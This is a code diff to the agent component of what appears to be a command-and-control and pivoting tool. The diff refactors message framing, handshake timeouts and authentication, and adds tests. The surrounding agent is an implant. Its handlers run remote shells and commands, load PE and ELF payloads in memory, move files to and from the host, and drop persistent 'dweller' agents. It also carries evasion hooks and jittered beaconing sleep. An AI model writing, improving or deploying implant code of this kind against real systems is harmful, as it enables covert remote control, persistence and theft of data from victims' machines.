@@ -1,5 +1,10 @@
 use crate::agent::connection::{ConnectionManager, ControlConnectionConfig};
-// reverse_port_forward: background response channel utilities
+use crate::agent::reverse_port_forward::{
+    connect_target, get_response_channel, AgentPortal, PortalConnectionRegistry,
+};
+use crate::framing::{FrameCodec, FrameReader, HANDSHAKE_TIMEOUT};
+use crate::portal;
+use crate::security::{keys_match, parse_pem_pair};
 
 use crate::agent::command_executor::{CommandExecutor, OSDetector};
 use crate::agent::evasion::{EvasionHook, EvasionManager};
@@ -13,20 +18,18 @@ use crate::protocol::{
 };
 use crate::security::SecurityManager;
 
-use crate::streaming::models::{CloseReason, ConnectionId, DataDirection, StreamMessage};
+use crate::streaming::models::StreamMessage;
 use crate::styling;
 use crate::transport::{QuicBidiStream, TransportMode};
 use base64::{engine::general_purpose, Engine as _};
-use bytes::Bytes;
 use rand::Rng;
 use std::path::{Path, PathBuf};
 use std::sync::Arc;
 use std::sync::OnceLock;
-use tokio::io::{AsyncBufReadExt, AsyncRead, AsyncReadExt, AsyncWrite, AsyncWriteExt};
-use tokio::net::tcp::OwnedWriteHalf;
+use tokio::io::{AsyncRead, AsyncWrite, AsyncWriteExt};
 use tokio::net::{TcpListener, TcpStream};
 use tokio::task::JoinHandle;
-use tokio::time::{sleep, Duration};
+use tokio::time::{sleep, timeout, Duration};
 use tokio_rustls::TlsAcceptor;
 use tracing::{error, info, warn};
 
@@ -71,6 +74,16 @@ static DWELLER_CONTEXT: OnceLock<DwellerRuntimeContext> = OnceLock::new();
 static DWELLER_CALLBACKS: OnceLock<
     std::sync::Mutex<std::collections::HashMap<String, DwellerCallbackSupervisor>>,
 > = OnceLock::new();
+
+fn agent_portal() -> &'static AgentPortal {
+    static PORTAL: OnceLock<AgentPortal> = OnceLock::new();
+    PORTAL.get_or_init(|| {
+        AgentPortal::new(
+            Arc::new(PortalConnectionRegistry::default()),
+            get_response_channel().0.clone(),
+        )
+    })
+}
 
 struct DwellerCallbackSupervisor {
     signature: String,
@@ -119,114 +132,37 @@ impl AgentCore {
                         }
                     }
                 };
-            let mut control_stream = control_connection.stream;
-
-            // Send agent registration
-            let register_msg = Message::AgentRegister(agent_info.clone());
-            let msg_str = serde_json::to_string(&register_msg)?;
-
-            if let Err(e) = control_stream.write_all(msg_str.as_bytes()).await {
-                error!(
-                    "{} Failed to send registration: {}",
-                    styling::ERROR_INDICATOR,
-                    e
-                );
-                if connection_config.retry {
-                    sleep(Duration::from_secs(5)).await;
-                    continue;
-                } else {
-                    return Err(LabyrinthError::Io(e));
-                }
-            }
-
-            if let Err(e) = control_stream.write_all(b"\n").await {
-                error!(
-                    "{} Failed to send delimiter: {}",
-                    styling::ERROR_INDICATOR,
-                    e
-                );
-                if connection_config.retry {
-                    sleep(Duration::from_secs(5)).await;
-                    continue;
-                } else {
-                    return Err(LabyrinthError::Io(e));
-                }
-            }
-
-            // Wait for acknowledgment
-            let mut buf = Vec::new();
-            let mut reader = tokio::io::BufReader::new(&mut control_stream);
-            match reader.read_until(b'\n', &mut buf).await {
-                Ok(_) => {
-                    let response: Message = match serde_json::from_slice(&buf[..buf.len() - 1]) {
-                        Ok(msg) => msg,
-                        Err(e) => {
-                            error!(
-                                "{} Failed to parse server response: {}",
-                                styling::ERROR_INDICATOR,
-                                e
-                            );
-                            if connection_config.retry {
-                                sleep(Duration::from_secs(5)).await;
-                                continue;
-                            } else {
-                                return Err(LabyrinthError::Json(e));
-                            }
-                        }
-                    };
-
-                    match response {
-                        Message::AgentAck => {
-                            info!(
-                                "{} Successfully registered with server",
-                                styling::SUCCESS_INDICATOR
-                            );
-                        }
-                        _ => {
-                            error!(
-                                "{} Unexpected response from server: {:?}",
-                                styling::ERROR_INDICATOR,
-                                response
-                            );
-                            if connection_config.retry {
-                                sleep(Duration::from_secs(5)).await;
-                                continue;
-                            } else {
-                                return Err(LabyrinthError::Message(
-                                    "Unexpected server response".to_string(),
-                                ));
-                            }
+            let quic_connection = control_connection.quic_connection;
+            let control_stream =
+                match Self::register_control_stream(control_connection.stream, &agent_info).await {
+                    Ok(stream) => stream,
+                    Err(e) => {
+                        error!("{} Registration failed: {}", styling::ERROR_INDICATOR, e);
+                        if connection_config.retry {
+                            sleep(Duration::from_secs(5)).await;
+                            continue;
+                        } else {
+                            return Err(e);
                         }
                     }
-                }
-                Err(e) => {
-                    error!(
-                        "{} Failed to read server response: {}",
-                        styling::ERROR_INDICATOR,
-                        e
-                    );
-                    if connection_config.retry {
-                        sleep(Duration::from_secs(5)).await;
-                        continue;
-                    } else {
-                        return Err(LabyrinthError::Io(e));
-                    }
-                }
-            }
+                };
+            info!(
+                "{} Successfully registered with server",
+                styling::SUCCESS_INDICATOR
+            );
 
             let (control_reader, mut control_writer) = tokio::io::split(control_stream);
-            let reader = tokio::io::BufReader::new(control_reader);
 
             info!(
                 "{} Agent connected and ready for commands",
                 styling::SUCCESS_INDICATOR
             );
 
-            if let Some(connection) = control_connection.quic_connection {
+            if let Some(connection) = quic_connection {
                 tokio::spawn(Self::run_quic_stream_acceptor(connection));
             }
 
-            Self::run_control_loop(reader, &mut control_writer).await;
+            Self::run_control_loop(control_reader, &mut control_writer).await;
 
             if !connection_config.retry {
                 break;
@@ -240,6 +176,31 @@ impl AgentCore {
         }
 
         Ok(())
+    }
+
+    /// Send `AgentRegister` on a fresh control stream and wait for `AgentAck`.
+    /// The returned reader keeps any bytes the server sent after the ack.
+    pub(crate) async fn register_control_stream<S>(
+        stream: S,
+        agent_info: &AgentInfo,
+    ) -> Result<tokio::io::BufReader<S>>
+    where
+        S: AsyncRead + AsyncWrite + Unpin,
+    {
+        let mut stream = tokio::io::BufReader::new(stream);
+        FrameCodec::HANDSHAKE
+            .write(&mut stream, &Message::AgentRegister(agent_info.clone()))
+            .await?;
+        match FrameCodec::HANDSHAKE
+            .read_required::<_, Message>(&mut stream, HANDSHAKE_TIMEOUT)
+            .await?
+        {
+            Message::AgentAck => Ok(stream),
+            other => Err(LabyrinthError::Message(format!(
+                "Unexpected server response during registration: {:?}",
+                other
+            ))),
+        }
     }
 
     pub async fn run_dweller(config: DwellerRunConfig) -> Result<()> {
@@ -258,21 +219,10 @@ impl AgentCore {
             .await
             .map_err(LabyrinthError::Io)?;
 
-        let mut cert_reader = cert_pem.as_bytes();
-        let certs = rustls_pemfile::certs(&mut cert_reader)
-            .collect::<std::result::Result<Vec<_>, std::io::Error>>()
-            .map_err(LabyrinthError::Io)?;
-        let mut key_reader = key_pem.as_bytes();
-        let mut keys = rustls_pemfile::pkcs8_private_keys(&mut key_reader)
-            .collect::<std::result::Result<Vec<_>, std::io::Error>>()
-            .map_err(LabyrinthError::Io)?;
-        let key = keys
-            .pop()
-            .ok_or_else(|| LabyrinthError::Message("No private key found".to_string()))?;
-
+        let (certs, key) = parse_pem_pair(&cert_pem, &key_pem)?;
         let tls_config = rustls::ServerConfig::builder()
             .with_no_client_auth()
-            .with_single_cert(certs, key.into())?;
+            .with_single_cert(certs, key)?;
         let acceptor = TlsAcceptor::from(Arc::new(tls_config));
         let listener = TcpListener::bind(&config.listen_addr)
             .await
@@ -574,25 +524,8 @@ impl AgentCore {
                 alpn: endpoint.alpn.clone(),
             })
             .await?;
-        let mut control_stream = control_connection.stream;
-        Self::write_message(
-            &mut control_stream,
-            &Message::AgentRegister(agent_info.clone()),
-        )
-        .await?;
-
-        let mut reader = tokio::io::BufReader::new(control_stream);
-        let mut buf = Vec::new();
-        reader.read_until(b'\n', &mut buf).await?;
-        let response: Message = serde_json::from_slice(&buf[..buf.len() - 1])?;
-        if !matches!(response, Message::AgentAck) {
-            return Err(LabyrinthError::Message(format!(
-                "Unexpected server response during dweller poll: {:?}",
-                response
-            )));
-        }
-
-        let mut stream = reader.into_inner();
+        let mut stream =
+            Self::register_control_stream(control_connection.stream, agent_info).await?;
         Self::write_message(
             &mut stream,
             &Message::DwellerPollTasks {
@@ -602,11 +535,10 @@ impl AgentCore {
         )
         .await?;
 
-        let mut reader = tokio::io::BufReader::new(stream);
-        buf.clear();
-        reader.read_until(b'\n', &mut buf).await?;
-        let tasks_message: Message = serde_json::from_slice(&buf[..buf.len() - 1])?;
-        let tasks = match tasks_message {
+        let tasks = match FrameCodec::CONTROL
+            .read_required::<_, Message>(&mut stream, HANDSHAKE_TIMEOUT)
+            .await?
+        {
             Message::DwellerTasks { tasks } => tasks,
             other => {
                 return Err(LabyrinthError::Message(format!(
@@ -616,7 +548,6 @@ impl AgentCore {
             }
         };
 
-        let mut stream = reader.into_inner();
         let mut completed = 0;
         for task in tasks {
             let result = Self::execute_dweller_task(task).await;
@@ -718,17 +649,20 @@ impl AgentCore {
         listen_addr: String,
         name: Option<String>,
     ) -> Result<()> {
-        let tls_stream = acceptor.accept(stream).await.map_err(LabyrinthError::Io)?;
+        let tls_stream = timeout(HANDSHAKE_TIMEOUT, acceptor.accept(stream))
+            .await
+            .map_err(|_| LabyrinthError::Message("Dweller TLS handshake timed out".into()))?
+            .map_err(LabyrinthError::Io)?;
         let (tls_reader, mut tls_writer) = tokio::io::split(tls_stream);
         let mut reader = tokio::io::BufReader::new(tls_reader);
-        let mut buf = Vec::new();
-        reader.read_until(b'\n', &mut buf).await?;
 
-        let hello: Message = serde_json::from_slice(&buf[..buf.len() - 1])?;
+        let hello: Message = FrameCodec::HANDSHAKE
+            .read_required(&mut reader, HANDSHAKE_TIMEOUT)
+            .await?;
         match hello {
-            Message::DwellerHello { auth_key } if auth_key == expected_auth_key => {}
+            Message::DwellerHello { auth_key } if keys_match(&auth_key, &expected_auth_key) => {}
             _ => {
-                return Err(LabyrinthError::Message(
+                return Err(LabyrinthError::Auth(
                     "Dweller authentication failed".to_string(),
                 ));
             }
@@ -749,9 +683,9 @@ impl AgentCore {
         );
         Self::write_message(&mut tls_writer, &Message::AgentRegister(info)).await?;
 
-        buf.clear();
-        reader.read_until(b'\n', &mut buf).await?;
-        let response: Message = serde_json::from_slice(&buf[..buf.len() - 1])?;
+        let response: Message = FrameCodec::HANDSHAKE
+            .read_required(&mut reader, HANDSHAKE_TIMEOUT)
+            .await?;
         match response {
             Message::AgentAck => {
                 Self::run_control_loop(reader, &mut tls_writer).await;
@@ -763,7 +697,7 @@ impl AgentCore {
         }
     }
 
-    async fn run_control_loop<R, W>(mut reader: tokio::io::BufReader<R>, writer: &mut W)
+    async fn run_control_loop<R, W>(reader: R, writer: &mut W)
     where
         R: AsyncRead + Unpin,
         W: AsyncWrite + Unpin,
@@ -771,27 +705,24 @@ impl AgentCore {
         use crate::agent::reverse_port_forward::get_response_channel;
 
         let (_, response_receiver) = get_response_channel();
+        // FrameReader keeps partial frames when the response branch wins the select.
+        let mut frames = FrameReader::new(tokio::io::BufReader::new(reader), FrameCodec::CONTROL);
 
         loop {
-            let mut buf = Vec::new();
             let mut response_receiver_guard = response_receiver.lock().await;
 
             tokio::select! {
-                read_result = reader.read_until(b'\n', &mut buf) => {
+                read_result = frames.next::<Message>() => {
                     match read_result {
-                        Ok(0) => {
+                        Ok(None) => {
                             warn!("{} Server closed connection", styling::WARNING_INDICATOR);
                             break;
                         }
-                        Ok(_) => {
-                            let message: Message = match serde_json::from_slice(&buf[..buf.len()-1]) {
-                                Ok(msg) => msg,
-                                Err(e) => {
-                                    error!("{} Failed to parse message: {}", styling::ERROR_INDICATOR, e);
-                                    continue;
-                                }
-                            };
-
+                        Err(LabyrinthError::Json(e)) => {
+                            error!("{} Failed to parse message: {}", styling::ERROR_INDICATOR, e);
+                            continue;
+                        }
+                        Ok(Some(message)) => {
                             drop(response_receiver_guard);
                             if let Err(e) = Self::handle_message(message, writer).await {
                                 error!("{} Failed to handle message: {}", styling::ERROR_INDICATOR, e);
@@ -814,13 +745,17 @@ impl AgentCore {
                 }
             }
         }
+        if let Err(error) = agent_portal().registry().close_all().await {
+            error!(
+                "{} Portal cleanup failed on control disconnect: {}",
+                styling::ERROR_INDICATOR,
+                error
+            );
+        }
     }
 
     async fn write_message<W: AsyncWrite + Unpin>(writer: &mut W, message: &Message) -> Result<()> {
-        let payload = serde_json::to_string(message)?;
-        writer.write_all(payload.as_bytes()).await?;
-        writer.write_all(b"\n").await?;
-        Ok(())
+        FrameCodec::CONTROL.write(writer, message).await
     }
 
     async fn handle_message<W: AsyncWrite + Unpin>(
@@ -836,9 +771,7 @@ impl AgentCore {
                 );
                 // Agent remains unprivileged; server owns TUN and stack. Just ACK.
                 let ack_msg = Message::TunnelStarted;
-                let ack_str = serde_json::to_string(&ack_msg)?;
-                tls_writer.write_all(ack_str.as_bytes()).await?;
-                tls_writer.write_all(b"\n").await?;
+                Self::write_message(tls_writer, &ack_msg).await?;
                 info!(
                     "{} Tunnel acknowledged for subnet {} (server-side TUN: {})",
                     styling::SUCCESS_INDICATOR,
@@ -854,10 +787,7 @@ impl AgentCore {
 
                 // Acknowledge tunnel stop
                 let ack_msg = Message::TunnelStopped;
-                let ack_str = serde_json::to_string(&ack_msg)?;
-
-                tls_writer.write_all(ack_str.as_bytes()).await?;
-                tls_writer.write_all(b"\n").await?;
+                Self::write_message(tls_writer, &ack_msg).await?;
 
                 info!("{} Tunnel stopped", styling::SUCCESS_INDICATOR);
             }
@@ -865,10 +795,7 @@ impl AgentCore {
             Message::Ping => {
                 // Respond to ping
                 let pong_msg = Message::Pong;
-                let pong_str = serde_json::to_string(&pong_msg)?;
-
-                tls_writer.write_all(pong_str.as_bytes()).await?;
-                tls_writer.write_all(b"\n").await?;
+                Self::write_message(tls_writer, &pong_msg).await?;
             }
             Message::ConfigureDweller { config } => {
                 let response = if let Some(context) = DWELLER_CONTEXT.get() {
@@ -900,9 +827,7 @@ impl AgentCore {
                         message: "Connected endpoint is not running as a dweller".to_string(),
                     }
                 };
-                let response_str = serde_json::to_string(&response)?;
-                tls_writer.write_all(response_str.as_bytes()).await?;
-                tls_writer.write_all(b"\n").await?;
+                Self::write_message(tls_writer, &response).await?;
             }
             Message::PortalPortForward {
                 local_port,
@@ -955,9 +880,7 @@ impl AgentCore {
                     },
                 };
 
-                let response_str = serde_json::to_string(&response)?;
-                tls_writer.write_all(response_str.as_bytes()).await?;
-                tls_writer.write_all(b"\n").await?;
+                Self::write_message(tls_writer, &response).await?;
 
                 info!(
                     "{} Command execution completed: {}",
@@ -990,9 +913,7 @@ impl AgentCore {
                     },
                 };
 
-                let response_str = serde_json::to_string(&response)?;
-                tls_writer.write_all(response_str.as_bytes()).await?;
-                tls_writer.write_all(b"\n").await?;
+                Self::write_message(tls_writer, &response).await?;
             }
             Message::ReflectiveLoadRequest { pe_data, args } => {
                 info!(
@@ -1014,9 +935,7 @@ impl AgentCore {
                     },
                 };
 
-                let response_str = serde_json::to_string(&response)?;
-                tls_writer.write_all(response_str.as_bytes()).await?;
-                tls_writer.write_all(b"\n").await?;
+                Self::write_message(tls_writer, &response).await?;
             }
             Message::LinuxElfExecutionRequest { elf_data, args } => {
                 info!(
@@ -1038,9 +957,7 @@ impl AgentCore {
                     },
                 };
 
-                let response_str = serde_json::to_string(&response)?;
-                tls_writer.write_all(response_str.as_bytes()).await?;
-                tls_writer.write_all(b"\n").await?;
+                Self::write_message(tls_writer, &response).await?;
             }
             Message::FileUpload {
                 remote_path,
@@ -1082,9 +999,7 @@ impl AgentCore {
                     },
                 };
 
-                let response_str = serde_json::to_string(&response)?;
-                tls_writer.write_all(response_str.as_bytes()).await?;
-                tls_writer.write_all(b"\n").await?;
+                Self::write_message(tls_writer, &response).await?;
             }
             Message::FileDownloadRequest { remote_path } => {
                 let response = match tokio::fs::read(&remote_path).await {
@@ -1102,9 +1017,7 @@ impl AgentCore {
                     },
                 };
 
-                let response_str = serde_json::to_string(&response)?;
-                tls_writer.write_all(response_str.as_bytes()).await?;
-                tls_writer.write_all(b"\n").await?;
+                Self::write_message(tls_writer, &response).await?;
             }
             Message::DropDweller { request } => {
                 let response = match Self::install_dweller(request).await {
@@ -1123,9 +1036,7 @@ impl AgentCore {
                     },
                 };
 
-                let response_str = serde_json::to_string(&response)?;
-                tls_writer.write_all(response_str.as_bytes()).await?;
-                tls_writer.write_all(b"\n").await?;
+                Self::write_message(tls_writer, &response).await?;
             }
             Message::ShellSessionStart {
                 session_id,
@@ -1139,9 +1050,7 @@ impl AgentCore {
                         success: false,
                         message: e.to_string(),
                     };
-                    let response_str = serde_json::to_string(&response)?;
-                    tls_writer.write_all(response_str.as_bytes()).await?;
-                    tls_writer.write_all(b"\n").await?;
+                    Self::write_message(tls_writer, &response).await?;
                 }
             }
             Message::ShellSessionInput {
@@ -1154,9 +1063,7 @@ impl AgentCore {
                         data_b64: general_purpose::STANDARD
                             .encode(format!("\n[labyrinth shell error] {}\n", e)),
                     };
-                    let response_str = serde_json::to_string(&response)?;
-                    tls_writer.write_all(response_str.as_bytes()).await?;
-                    tls_writer.write_all(b"\n").await?;
+                    Self::write_message(tls_writer, &response).await?;
                 }
             }
             Message::ShellSessionResize {
@@ -1478,18 +1385,6 @@ impl AgentCore {
         Ok(())
     }
 
-    // Simple in-memory map of active target writers for streaming connections
-    fn stream_writers() -> &'static tokio::sync::RwLock<
-        std::collections::HashMap<ConnectionId, Arc<tokio::sync::Mutex<OwnedWriteHalf>>>,
-    > {
-        static WRITERS: std::sync::OnceLock<
-            tokio::sync::RwLock<
-                std::collections::HashMap<ConnectionId, Arc<tokio::sync::Mutex<OwnedWriteHalf>>>,
-            >,
-        > = std::sync::OnceLock::new();
-        WRITERS.get_or_init(|| tokio::sync::RwLock::new(std::collections::HashMap::new()))
-    }
-
     async fn run_quic_stream_acceptor(connection: quinn::Connection) {
         loop {
             match connection.accept_bi().await {
@@ -1517,60 +1412,33 @@ impl AgentCore {
         recv: quinn::RecvStream,
     ) -> Result<()> {
         let mut reader = tokio::io::BufReader::new(recv);
-        let mut setup_buf = Vec::new();
-        reader.read_until(b'\n', &mut setup_buf).await?;
-        let message: Message =
-            serde_json::from_slice(&setup_buf[..setup_buf.len().saturating_sub(1)])?;
-        let (connection_id, mapping) = match message {
-            Message::Stream(StreamMessage::Setup {
-                connection_id,
-                mapping,
-            }) => (connection_id, mapping),
-            other => {
-                return Err(LabyrinthError::Message(format!(
-                    "Unexpected QUIC stream setup message: {:?}",
-                    other
-                )))
-            }
-        };
+        let (connection_id, mapping) =
+            portal::read_quic_setup(&mut reader, HANDSHAKE_TIMEOUT).await?;
 
-        let target_addr = format!("{}:{}", mapping.target_host, mapping.target_port);
-        let mut target = match TcpStream::connect(&target_addr).await {
+        let mut target = match connect_target(&mapping).await {
             Ok(stream) => {
-                let ack = Message::Stream(StreamMessage::SetupAck {
-                    connection_id,
-                    success: true,
-                    error_message: None,
-                });
-                let ack_line = serde_json::to_string(&ack)?;
-                send.write_all(ack_line.as_bytes())
-                    .await
-                    .map_err(|e| LabyrinthError::Message(format!("QUIC write failed: {}", e)))?;
-                send.write_all(b"\n")
-                    .await
-                    .map_err(|e| LabyrinthError::Message(format!("QUIC write failed: {}", e)))?;
+                portal::write_quic_setup_ack(&mut send, connection_id, None).await?;
                 stream
             }
             Err(e) => {
-                let ack = Message::Stream(StreamMessage::SetupAck {
+                portal::write_quic_setup_ack(
+                    &mut send,
                     connection_id,
-                    success: false,
-                    error_message: Some(format!(
-                        "Failed to connect to target {}: {}",
-                        target_addr, e
+                    Some(format!(
+                        "Failed to connect to target {}:{}: {}",
+                        mapping.target_host, mapping.target_port, e
                     )),
-                });
-                let ack_line = serde_json::to_string(&ack)?;
-                send.write_all(ack_line.as_bytes())
-                    .await
-                    .map_err(|e| LabyrinthError::Message(format!("QUIC write failed: {}", e)))?;
-                send.write_all(b"\n")
-                    .await
-                    .map_err(|e| LabyrinthError::Message(format!("QUIC write failed: {}", e)))?;
-                return Err(LabyrinthError::Io(e));
+                )
+                .await?;
+                return Err(e);
             }
         };
 
+        // Bytes the server sent right after setup may already sit in the buffer.
+        let early_data = reader.buffer().to_vec();
+        if !early_data.is_empty() {
+            target.write_all(&early_data).await?;
+        }
         let recv = reader.into_inner();
         let mut quic_stream = QuicBidiStream::new(send, recv);
         tokio::io::copy_bidirectional(&mut quic_stream, &mut target).await?;
@@ -1578,120 +1446,7 @@ impl AgentCore {
     }
 
     async fn handle_stream_message(stream_message: StreamMessage) -> Result<()> {
-        match stream_message {
-            StreamMessage::Setup {
-                connection_id,
-                mapping,
-            } => {
-                // Connect to target and start piping data back to server
-                let target_addr = format!("{}:{}", mapping.target_host, mapping.target_port);
-                let (tx, _rx) = crate::agent::reverse_port_forward::get_response_channel();
-                let stream = match TcpStream::connect(&target_addr).await {
-                    Ok(stream) => {
-                        let ack = StreamMessage::SetupAck {
-                            connection_id,
-                            success: true,
-                            error_message: None,
-                        };
-                        if let Err(e) = tx.send(Message::Stream(ack)).await {
-                            error!(
-                                "{} Failed to send setup acknowledgment for {}: {}",
-                                styling::ERROR_INDICATOR,
-                                target_addr,
-                                e
-                            );
-                        }
-                        stream
-                    }
-                    Err(e) => {
-                        let ack = StreamMessage::SetupAck {
-                            connection_id,
-                            success: false,
-                            error_message: Some(format!(
-                                "Failed to connect to target {}: {}",
-                                target_addr, e
-                            )),
-                        };
-                        let _ = tx.send(Message::Stream(ack)).await;
-                        return Err(LabyrinthError::Io(e));
-                    }
-                };
-
-                let (mut read_half, write_half) = stream.into_split();
-
-                // Store writer for future ClientToTarget writes
-                {
-                    let mut writers = Self::stream_writers().write().await;
-                    writers.insert(connection_id, Arc::new(tokio::sync::Mutex::new(write_half)));
-                }
-
-                // Spawn a task to read from target and send to server
-                let tx_clone = tx.clone();
-                tokio::spawn(async move {
-                    let mut buf = vec![0u8; 65536];
-                    loop {
-                        match read_half.read(&mut buf).await {
-                            Ok(0) => {
-                                // Target closed
-                                let _ = tx_clone
-                                    .send(Message::Stream(StreamMessage::Close {
-                                        connection_id,
-                                        reason: CloseReason::ClientDisconnected,
-                                    }))
-                                    .await;
-                                break;
-                            }
-                            Ok(n) => {
-                                let payload = Bytes::copy_from_slice(&buf[..n]);
-                                let _ = tx_clone
-                                    .send(Message::Stream(StreamMessage::Data {
-                                        connection_id,
-                                        payload,
-                                        direction: DataDirection::TargetToClient,
-                                    }))
-                                    .await;
-                            }
-                            Err(e) => {
-                                let _ = tx_clone
-                                    .send(Message::Stream(StreamMessage::Close {
-                                        connection_id,
-                                        reason: CloseReason::ProtocolError(e.to_string()),
-                                    }))
-                                    .await;
-                                break;
-                            }
-                        }
-                    }
-                });
-            }
-            StreamMessage::Data {
-                connection_id,
-                payload,
-                direction,
-            } => {
-                if matches!(direction, DataDirection::ClientToTarget) {
-                    // Write client->target data to the stored writer
-                    let writer_arc = {
-                        let writers = Self::stream_writers().read().await;
-                        writers.get(&connection_id).cloned()
-                    };
-                    if let Some(writer_arc) = writer_arc {
-                        let mut writer = writer_arc.lock().await;
-                        writer
-                            .write_all(&payload)
-                            .await
-                            .map_err(LabyrinthError::Io)?;
-                    }
-                }
-            }
-            StreamMessage::Close { connection_id, .. } => {
-                // Remove writer to cleanup
-                let mut writers = Self::stream_writers().write().await;
-                writers.remove(&connection_id);
-            }
-            _ => {}
-        }
-        Ok(())
+        agent_portal().handle(stream_message).await
     }
 
     // Removed unused reverse port forward helpers; streaming handles data plane
@@ -1854,5 +1609,221 @@ mod tests {
             other => panic!("unexpected message {other:?}"),
         }
         drain_responses().await;
+    }
+
+    fn test_agent_info() -> AgentInfo {
+        AgentInfo {
+            name: "unit".into(),
+            hostname: "unit-host".into(),
+            os: "linux".into(),
+            arch: "x86_64".into(),
+            interfaces: vec![],
+            auth_key: Some("k".into()),
+            kind: AgentKind::Generic,
+            stable_id: None,
+            listener_addr: None,
+            listener_port: None,
+            connectivity: Default::default(),
+        }
+    }
+
+    #[tokio::test]
+    async fn register_control_stream_keeps_bytes_sent_right_after_ack() {
+        let (client, server) = tokio::io::duplex(4096);
+        let fake_server = tokio::spawn(async move {
+            let mut server = tokio::io::BufReader::new(server);
+            let first: Message = FrameCodec::HANDSHAKE
+                .read_required(&mut server, Duration::from_secs(5))
+                .await
+                .unwrap();
+            assert!(matches!(first, Message::AgentRegister(ref info) if info.name == "unit"));
+            // Ack and the first command in one write, as a fast server would.
+            let mut burst = FrameCodec::CONTROL.encode(&Message::AgentAck).unwrap();
+            burst.extend(FrameCodec::CONTROL.encode(&Message::Ping).unwrap());
+            server.get_mut().write_all(&burst).await.unwrap();
+            server
+        });
+
+        let mut stream = AgentCore::register_control_stream(client, &test_agent_info())
+            .await
+            .unwrap();
+        let next: Option<Message> = FrameCodec::CONTROL.read(&mut stream).await.unwrap();
+        assert!(matches!(next, Some(Message::Ping)), "lost post-ack frame");
+        drop(fake_server.await.unwrap());
+    }
+
+    #[tokio::test]
+    async fn register_control_stream_rejects_non_ack_and_eof() {
+        let (client, server) = tokio::io::duplex(4096);
+        tokio::spawn(async move {
+            let mut server = tokio::io::BufReader::new(server);
+            let _: Message = FrameCodec::HANDSHAKE
+                .read_required(&mut server, Duration::from_secs(5))
+                .await
+                .unwrap();
+            FrameCodec::CONTROL
+                .write(server.get_mut(), &Message::Pong)
+                .await
+                .unwrap();
+        });
+        assert!(
+            AgentCore::register_control_stream(client, &test_agent_info())
+                .await
+                .is_err()
+        );
+
+        let (client, server) = tokio::io::duplex(4096);
+        drop(server);
+        assert!(
+            AgentCore::register_control_stream(client, &test_agent_info())
+                .await
+                .is_err()
+        );
+    }
+
+    async fn dweller_handshake(sent_key: &str) -> (Result<()>, Option<Message>) {
+        let identity = SecurityManager::generate_self_signed_certificate("dweller").unwrap();
+        let (certs, key) = parse_pem_pair(&identity.cert_pem, &identity.key_pem).unwrap();
+        let acceptor = TlsAcceptor::from(Arc::new(
+            rustls::ServerConfig::builder()
+                .with_no_client_auth()
+                .with_single_cert(certs, key)
+                .unwrap(),
+        ));
+        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let addr = listener.local_addr().unwrap();
+        let dweller = tokio::spawn(async move {
+            let (stream, _) = listener.accept().await.unwrap();
+            AgentCore::handle_dweller_client(
+                acceptor,
+                stream,
+                "expected-key".into(),
+                "dw-unit".into(),
+                "127.0.0.1:45454".into(),
+                Some("unit".into()),
+            )
+            .await
+        });
+
+        let fingerprint = SecurityManager::fingerprint_from_pem(&identity.cert_pem).unwrap();
+        let config = SecurityManager::create_tls_client_config(None, Some(fingerprint)).unwrap();
+        let tcp = TcpStream::connect(addr).await.unwrap();
+        let tls = tokio_rustls::TlsConnector::from(Arc::new(config))
+            .connect(
+                rustls::pki_types::ServerName::try_from("localhost").unwrap(),
+                tcp,
+            )
+            .await
+            .unwrap();
+        let mut tls = tokio::io::BufReader::new(tls);
+        FrameCodec::HANDSHAKE
+            .write(
+                &mut tls,
+                &Message::DwellerHello {
+                    auth_key: sent_key.into(),
+                },
+            )
+            .await
+            .unwrap();
+        let reply = timeout(
+            Duration::from_secs(5),
+            FrameCodec::HANDSHAKE.read::<_, Message>(&mut tls),
+        )
+        .await
+        .unwrap()
+        .ok()
+        .flatten();
+        // Close before acking so the dweller never enters its control loop.
+        drop(tls);
+        let result = timeout(Duration::from_secs(5), dweller)
+            .await
+            .unwrap()
+            .unwrap();
+        (result, reply)
+    }
+
+    #[tokio::test]
+    async fn dweller_rejects_wrong_hello_key_without_revealing_identity() {
+        let (result, reply) = dweller_handshake("wrong-key").await;
+        assert!(matches!(result, Err(LabyrinthError::Auth(_))));
+        assert!(
+            reply.is_none(),
+            "dweller registered to an unauthenticated peer"
+        );
+    }
+
+    #[tokio::test]
+    async fn dweller_with_valid_hello_registers_with_stable_identity() {
+        let (result, reply) = dweller_handshake("expected-key").await;
+        match reply {
+            Some(Message::AgentRegister(info)) => {
+                assert!(matches!(info.kind, AgentKind::Dweller));
+                assert_eq!(info.stable_id.as_deref(), Some("dw-unit"));
+                assert_eq!(info.listener_addr.as_deref(), Some("127.0.0.1:45454"));
+                assert_eq!(info.listener_port, Some(45454));
+            }
+            other => panic!("expected AgentRegister, got {other:?}"),
+        }
+        // We hung up instead of acking.
+        assert!(result.is_err());
+    }
+
+    #[test]
+    fn jittered_sleep_stays_within_bounds() {
+        let config = DwellerHibernationConfig {
+            enabled: true,
+            sleep_seconds: 100,
+            jitter_percent: 20,
+            task_batch_size: 1,
+        };
+        for _ in 0..200 {
+            let secs = AgentCore::jittered_sleep_duration(&config).as_secs();
+            assert!((80..=120).contains(&secs), "{secs}s out of range");
+        }
+        let zero = DwellerHibernationConfig {
+            sleep_seconds: 0,
+            jitter_percent: 255,
+            ..config
+        };
+        // Base clamps to 1s and jitter clamps to 100%: never 0s, never runaway.
+        for _ in 0..200 {
+            let secs = AgentCore::jittered_sleep_duration(&zero).as_secs();
+            assert!((1..=2).contains(&secs), "{secs}s out of range");
+        }
+        let fixed = DwellerHibernationConfig {
+            jitter_percent: 0,
+            ..config
+        };
+        assert_eq!(AgentCore::jittered_sleep_duration(&fixed).as_secs(), 100);
+    }
+
+    #[tokio::test]
+    async fn long_lived_tasks_are_refused_in_hibernation_mode() {
+        for kind in [
+            DwellerTaskKind::StopTunnel,
+            DwellerTaskKind::StartTunnel {
+                subnet: "10.0.0.0/24".into(),
+                tun_name: "lab0".into(),
+            },
+            DwellerTaskKind::PortalPortForward {
+                local_port: 8080,
+                target_addr: "10.0.0.5:80".into(),
+                auth_key: None,
+            },
+        ] {
+            let result = AgentCore::execute_dweller_task(DwellerTask {
+                task_id: "t".into(),
+                kind,
+                status: crate::protocol::DwellerTaskStatus::Running,
+                created_at: "now".into(),
+                updated_at: None,
+                attempts: 1,
+                result: None,
+            })
+            .await;
+            assert!(!result.success);
+            assert_eq!(result.task_id, "t");
+            assert!(result.error.unwrap().contains("hibernation=false"));
+        }
     }
 }
